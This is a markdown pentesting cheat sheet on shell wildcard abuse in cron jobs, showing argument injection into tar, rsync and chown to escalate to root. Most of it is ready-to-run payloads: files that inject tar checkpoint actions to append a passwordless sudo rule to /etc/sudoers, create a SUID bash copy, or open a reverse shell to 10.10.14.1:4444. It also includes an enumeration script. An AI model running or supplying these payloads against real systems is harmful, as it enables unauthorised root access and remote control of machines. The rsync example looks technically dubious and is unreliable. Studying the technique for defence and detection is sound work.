---
# 🌟 Wildcard Abuse

> [!ABSTRACT] Overview of Wildcard Characters in Shell Commands
>
> Wildcard characters (`*`, `?`, `[]`) interpreted by shell can be abused to inject command arguments in scripts and cron jobs for privilege escalation.

## 🎯 Overview

> [!INFO] Summary of Wildcard Abuse
>
> Wildcard characters (`*`, `?`, `[]`) are used to match filenames in the shell. Misuse can lead to injecting arbitrary commands into scripts or cron jobs, potentially leading to privilege escalation.
>

### Wildcard Characters and Their Functions

| Character | Function |
|-----------|----------|
| `*`       | Matches any number of characters            |
| `?`       | Matches single character                    |
| `[]`      | Matches characters in brackets              |
| `~`       | User home directory                         |
| `-`       | Range in brackets                           |

---

## 🎯 tar Command Abuse (Most Common)

### Vulnerable Cron Job Example

```bash
# Cron job with wildcard
*/01 * * * * cd /home/user && tar -zcf backup.tar.gz *
```

### Exploitation Steps

> [!SUCCESS] Successful Exploitation of tar Command
>
> 1. Create malicious script:
>
> ```bash
> echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
> ```
>
> 2. Create argument injection files:
>
> ```bash
> echo "" > "--checkpoint-action=exec=sh root.sh"
> echo "" > --checkpoint=1
> ```
>
> 3. Wait for cron execution.
> 4. Check sudo privileges using `sudo -l`.

**How it works:** The wildcard `*` expands to all filenames, making tar execute:

```bash
tar -zcf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh
```

---

## 🔧 Other Vulnerable Commands

### rsync Abuse

> [!WARNING] Destructive Command Injection with rsync
>
> ```bash
> # Vulnerable: rsync -av * /backup/
> echo "" > "-e sh payload.sh"
> echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > payload.sh
> ```

### chown Abuse

```bash
# Vulnerable: chown root:root *
echo "" > "--reference=/etc/passwd"
# Makes files owned by root
```

---

## 🔍 Detection & Enumeration

### Find Vulnerable Scripts

```text
# Search for wildcard usage in scripts
grep -r "tar.*\*" /etc/cron* /opt/ /usr/local/ 2>/dev/null
grep -r "rsync.*\*" /etc/cron* /opt/ /usr/local/ 2>/dev/null

# Check crontab for wildcards
cat /etc/crontab | grep "\*"
```

### Quick Check Script

```bash
#!/bin/bash
echo "=== WILDCARD ABUSE CHECK ==="

echo "[+] Cron jobs with wildcards:"
cat /etc/crontab 2>/dev/null | grep "\*" | grep -v "^#"

echo "[+] Scripts using tar with wildcards:"
find /opt /usr/local -name "*.sh" -exec grep -l "tar.*\*" {} \; 2>/dev/null

echo "[+] Current directory writable for injections:"
test -w . && echo "WRITABLE: $(pwd)"
```

---

## 🚀 Common Payloads

### Add Sudo Privileges

```bash
echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

### Create SUID Binary

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > suid.sh
echo "" > "--checkpoint-action=exec=sh suid.sh"  
echo "" > --checkpoint=1
```

### Reverse Shell

```bash
echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

---

## 🔑 Key Points

- **Wildcards expand to filenames** - creating fake arguments.
- **tar is most common target** - `--checkpoint-action=exec`.
- **Works with cron jobs** - automatic execution as different user.
- **File creation required** - need write access to target directory.
- **Timing matters** - wait for scheduled execution.

*Wildcard abuse turns shell expansion features against the system - transforming filename globbing into arbitrary command execution for privilege escalation.*